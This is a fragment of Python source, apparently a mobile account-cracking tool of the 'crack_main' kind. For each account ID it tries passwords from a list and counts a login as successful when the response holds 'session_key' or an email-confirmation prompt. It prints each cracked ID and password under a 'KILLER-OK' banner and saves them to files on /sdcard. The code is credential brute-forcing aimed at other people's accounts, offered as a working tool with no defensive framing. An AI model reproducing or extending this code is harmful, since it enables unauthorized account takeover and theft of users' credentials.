...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[KILLER] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[KILLER-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[KILLER-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/killer_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/killer_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
